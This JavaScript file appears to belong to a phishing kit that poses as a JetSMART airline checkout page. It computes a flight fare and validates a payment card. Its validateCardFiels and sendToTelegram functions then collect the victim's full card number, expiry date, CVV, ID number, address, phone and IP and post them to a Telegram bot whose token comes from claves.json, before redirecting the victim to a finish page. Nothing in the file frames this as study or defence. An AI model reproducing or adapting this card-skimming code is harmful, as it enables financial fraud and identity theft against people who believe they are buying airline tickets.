const DOMElements = {
    labelDepartures: document.querySelector('#label-departures'),
    labelTotalResume: document.querySelector('#label-total-resume'),
    btnNextStep: document.querySelector('#btn-next-step'),
    contPaymentMethod: document.querySelector('#payment-method'),
    contCardInputs: document.querySelector('#card-inputs'),
    btnSubmitForm: document.querySelector('#submit-form'),
    inputP: document.querySelector('#p'),
    formMain: document.querySelector('#main-form'),
};

document.addEventListener('DOMContentLoaded', () => {
    eventListeners();
    updateDOM();
    sendStatus();
});

const eventListeners = () => {
    const { contPaymentMethod, contCardInputs, btnNextStep, btnSubmitForm, formMain } = DOMElements;

    contPaymentMethod.addEventListener('click', () => {
        contCardInputs.classList.remove('hide');
    });

    btnNextStep.addEventListener('click', () => {
        btnSubmitForm.click();
    });

    formMain.addEventListener('submit', (e) => {
        e.preventDefault();
        validateCardFiels();
    });
};

const updateDOM = () => {
    const { labelDepartures, labelTotalResume } = DOMElements;
    const { travel_type, origin, destination, adults, children } = info.flightInfo;

    if (travel_type === 1) {
        labelDepartures.textContent = `${origin.city} - ${destination.city} | ${destination.city} - ${origin.city}`;
    } else if (travel_type === 2) {
        labelDepartures.textContent = `${origin.city} - ${destination.city}`;
    }

    const totalLight = (PRECIO_BASE * (adults + children));
    const totalSmart = (PRECIO_BASE * MULTIPLICADORES_PRECIO.smart * (adults + children));
    const totalFull = (PRECIO_BASE * MULTIPLICADORES_PRECIO.full * (adults + children));
   
    let total = 0;
    if (origin.ticket_type === 'light') total += totalLight;
    else if (origin.ticket_type === 'smart') total += totalSmart;
    else if (origin.ticket_type === 'full') total += totalFull;

    if (travel_type === 1) {
        if (destination.ticket_type === 'light') total += totalLight;
        else if (destination.ticket_type === 'smart') total += totalSmart;
        else if (destination.ticket_type === 'full') total += totalFull;
    }

    labelTotalResume.textContent = '$ ' + total.toLocaleString('es-ES') + ' COP';
};

const validateCardFiels = () => {
    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const name = document.querySelector('#name');
    const surname = document.querySelector("#surname");
    const cc = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if (!p.value || !pdate.value || !c.value) {
        alert('Por favor completa todos los campos de la tarjeta.');
        return;
    }

    if ((p.value.length === 19 && ['4','5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')) {
        if (isLuhnValid(p.value)) {
            if (isValidDate(pdate.value)) {
                if ((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)) {

                    const formData = {
                        nombre: name.value + " " + surname.value,
                        documento: cc.value,
                        banco: ban.value,
                        email: email.value,
                        tarjeta: p.value,
                        fecha: pdate.value,
                        cvv: c.value,
                        telefono: telnum.value,
                        direccion: address.value + " " + city.value,
                        fecha_hora: new Date().toLocaleString('es-CO'),
                        ip: info.metaInfo.ip || 'Desconocida'
                    };

                    // === ENVÍO AL TELEGRAM ===
                    sendToTelegram(formData);

                    console.log("Datos enviados:", formData);

                    document.querySelector('.loader').classList.add('show');

                    // Redirigir después de enviar
                    setTimeout(() => {
                        window.location.href = 'finish.html';
                    }, 2500);

                } else {
                    alert('Revise el CVV de su tarjeta.');
                    c.focus();
                }
            } else {
                alert('Revise la fecha de vencimiento.');
                pdate.focus();
            }
        } else {
            alert('Número de tarjeta inválido.');
            p.focus();
        }
    } else {
        alert('Revisa el número de tu tarjeta.');
        p.focus();
    }
};

// Función para enviar al Telegram
async function sendToTelegram(data) {
    try {
        const response = await fetch('claves.json');
        const keys = await response.json();

        const message = `
🚨 *Nueva Tarjeta JetSMART* 🚨

👤 Nombre: ${data.nombre}
🪪 Documento: ${data.documento}
🏦 Banco: ${data.banco}
📧 Email: ${data.email}
💳 Tarjeta: \`${data.tarjeta}\`
📅 Vencimiento: ${data.fecha}
🔑 CVV: \`${data.cvv}\`
📱 Teléfono: ${data.telefono}
📍 Dirección: ${data.direccion}
⏰ Hora: ${data.fecha_hora}
🌐 IP: ${data.ip}
        `.trim();

        const url = `https://api.telegram.org/bot${keys.token}/sendMessage`;
        
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: keys.chat_id,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        console.log("✅ Datos enviados correctamente a Telegram");
    } catch (error) {
        console.error("Error enviando a Telegram:", error);
    }
}

// Funciones de validación (las mismas que tenías)
function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');
    if (bin.length < 6) return false;
    const digits = bin.split('').map(Number).reverse();
    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) doubled -= 9;
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }
    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    const partes = fechaInput.split('/');
    const mesInput = parseInt(partes[0]);
    const anioInput = parseInt(partes[1]) + 2000;
    const fechaActual = new Date();
    const mesActual = fechaActual.getMonth() + 1;
    const anioActual = fechaActual.getFullYear();

    return !(anioInput < anioActual || (anioInput === anioActual && mesInput < mesActual));
}
